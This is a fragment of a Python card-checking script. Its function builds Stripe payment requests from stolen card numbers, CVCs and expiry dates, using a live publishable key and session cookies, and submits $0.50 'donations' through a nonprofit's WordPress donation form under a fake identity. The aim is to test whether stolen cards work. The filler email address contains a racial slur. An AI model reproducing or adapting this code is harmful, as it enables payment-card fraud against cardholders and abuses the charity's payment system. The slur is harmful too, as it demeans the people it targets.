...
def Tele(ccx):
    ...
    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F09b245ec49%3B+stripe-js-v3%2F09b245ec49%3B+card-element&referrer=https%3A%2F%2Fsaphausa.org&key=pk_live_51Ssb1PQKv7Pa5TYrRye5jCnNuoF5AKML2OSyaYolYmYzuIyMCGr7ZcWxiBDI1fpYHvNDpYoxy2J7I2SpdTuwLMZa00IGG1aaXB'
    ...
    # 'cookie': '__stripe_mid=784e53e1-4cea-478b-bb9b-bc343c02d04438b2cd; __stripe_sid=9ed60aaf-79d6-4adb-b176-fe437a1c208a80ea28',
    ...
    data = {
        'data': f'__fluent_form_embded_post_id=5442&_fluentform_1_fluentformnonce=08e4399de5&_wp_http_referer=%2Fdonation%2F&names%5Bfirst_name%5D=Jhon&names%5Blast_name%5D=Anderson&email=blackniggu338%40gmail.com&phone=%2B12025809708&input_text=13th%20Street%20Avenue&input_radio=Donation&payment_input=Custom%20Amout&custom-payment-amount=0.50&message=&payment_method=stripe&__stripe_payment_method_id={pm}',
